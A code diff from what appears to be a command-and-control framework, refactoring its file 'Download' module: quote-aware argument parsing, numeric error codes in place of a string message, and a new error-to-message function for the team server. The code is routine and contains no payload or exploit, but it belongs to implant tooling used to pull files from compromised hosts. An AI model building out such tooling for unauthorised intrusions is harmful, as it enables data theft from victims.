@@ -56,12 +56,14 @@ std::string Download::getInfo()
 
 int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-	if (splitedCmd.size() == 3)
-	{
-		string inputFile = splitedCmd[1];
-		string outputFile = splitedCmd[2];
+	std::vector<std::string> quoteRegroupedCmd = regroupStrings(splitedCmd);
 
-		c2Message.set_instruction(splitedCmd[0]);
+	if (quoteRegroupedCmd.size() == 3)
+	{
+		string inputFile = quoteRegroupedCmd[1];
+		string outputFile = quoteRegroupedCmd[2];
+
+		c2Message.set_instruction(quoteRegroupedCmd[0]);
 		c2Message.set_inputfile(inputFile);
 		c2Message.set_outputfile(outputFile);
 	}
@@ -74,6 +76,7 @@ int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 	return 0;
 }
 
+#define ERROR_OPEN_FILE 1 
 
 int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
@@ -92,7 +95,7 @@ int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 	}
 	else
 	{
-		c2RetMessage.set_returnvalue("Failed: Couldn't open file.");
+		c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
 	}
 
 	return 0;
@@ -101,12 +104,30 @@ int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 int Download::followUp(const C2Message &c2RetMessage)
 {
-	std::string outputFile = c2RetMessage.outputfile();
-	std::ofstream output(outputFile, std::ios::binary);
+	// check if there is an error
+	if(c2RetMessage.errorCode()==-1)
+	{
+		std::string outputFile = c2RetMessage.outputfile();
+		std::ofstream output(outputFile, std::ios::binary);
 
-	const std::string buffer = c2RetMessage.data();
-	output << buffer;
-	output.close();
+		const std::string buffer = c2RetMessage.data();
+		output << buffer;
+		output.close();
+	}
 
+	return 0;
+}
+
+
+int Download::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
+{
+#ifdef BUILD_TEAMSERVER
+	int errorCode = c2RetMessage.errorCode();
+	if(errorCode>0)
+	{
+		if(errorCode==ERROR_OPEN_FILE)
+			errorMsg = "Failed: Couldn't open file";
+	}
+#endif
 	return 0;
 }
